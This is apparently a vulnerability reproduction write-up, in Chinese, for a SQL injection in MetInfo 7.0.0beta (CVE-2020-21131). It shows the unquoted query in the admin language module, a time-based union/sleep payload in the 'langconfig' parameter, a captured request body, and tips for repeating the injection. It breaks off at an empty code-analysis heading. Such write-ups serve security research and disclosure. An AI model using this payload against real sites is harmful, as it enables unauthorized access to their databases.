# MetInfo 7.0.0beta SQL注入(CVE-2020-21131)

## 简述

漏洞文件: /app/system/language/admin/language_web.class.php

漏洞代码: 

```php
<?php
class language_web extends admin{
    ...
    public function doAddLanguage(){
        ...
        $query = "SELECT * FROM {$_M['table']['app_config']} WHERE lang = {$_M['form']['langconfig']}";
        ...
    }
}
```

漏洞成因：SQL语句select中条件变量无单引号保护。

## 触发过程

漏洞触发过程: 

1. 首先登录后台(实战中只能配合弱密码和爆破之类的攻击手法来用了)

![image](https://user-images.githubusercontent.com/43318547/211571880-f7da76b8-9912-4b9b-b7a0-2d28688ab524.png)

2. 后台界面→多语言→添加新语言(在这个地方使用burpsuit抓包)

![image](https://user-images.githubusercontent.com/43318547/211577079-532b1b21-afd1-48b2-ac1d-364f394571c2.png)

3. burpsuit抓包之后，发送到repeater模块，在URL处添加参数langconfig。该参数为注入点，测试语句`langconfig=1 union select 1,2,3,4,sleep(10)#`。可以看到注入的SQL语句执行成功，页面延迟了10秒钟响应。

![image](https://user-images.githubusercontent.com/43318547/211578671-52ab5a86-8977-4890-86a3-4841cc6525d0.png)

## 注意事项

在第一次注入成功之后。如果需要重复注入，则需要对数据包中的某些参数进行更改。在上面的步骤中，你应该在burpsuit的repeater模块拥有一个HTTP请求。它的请求体大致如下。

```text
-----------------------------70216930042812643122266473104
Content-Disposition: form-data; name="order"

9
-----------------------------70216930042812643122266473104
Content-Disposition: form-data; name="autor"

sa
-----------------------------70216930042812643122266473104
Content-Disposition: form-data; name="name"

bbb
-----------------------------70216930042812643122266473104
Content-Disposition: form-data; name="flag"

fa.gif
-----------------------------70216930042812643122266473104
Content-Disposition: form-data; name="mark"

tet2
-----------------------------70216930042812643122266473104
Content-Disposition: form-data; name="file"

cn
-----------------------------70216930042812643122266473104
Content-Disposition: form-data; name="copy_config"

cn
-----------------------------70216930042812643122266473104
Content-Disposition: form-data; name="content"


-----------------------------70216930042812643122266473104
Content-Disposition: form-data; name="theme_style"


-----------------------------70216930042812643122266473104
Content-Disposition: form-data; name="useok"

1
-----------------------------70216930042812643122266473104
Content-Disposition: form-data; name="link"


-----------------------------70216930042812643122266473104
Content-Disposition: form-data; name="useok"

1
-----------------------------70216930042812643122266473104
Content-Disposition: form-data; name="newwindows"

0
-----------------------------70216930042812643122266473104
Content-Disposition: form-data; name="type"

0
-----------------------------70216930042812643122266473104
Content-Disposition: form-data; name="submit_type"

save
-----------------------------70216930042812643122266473104--

```

特别注意以下三个参数
* name="order"
* name="autor"
* name="mark"

在每次注入过程中，首先要保证 `name="order"` 的值每次都不同。

如果 `name="autor"` 的值存在，则让 `name="autor"` 的值每次都不同即可，这时候 `name="mark"` 的值不重要。

如果 `name="autor"` 的值不存在（即为空），则让 `name="mark"` 的值每次都不同即可。

具体原因将在下面的代码分析环节阐述。

## 代码调试

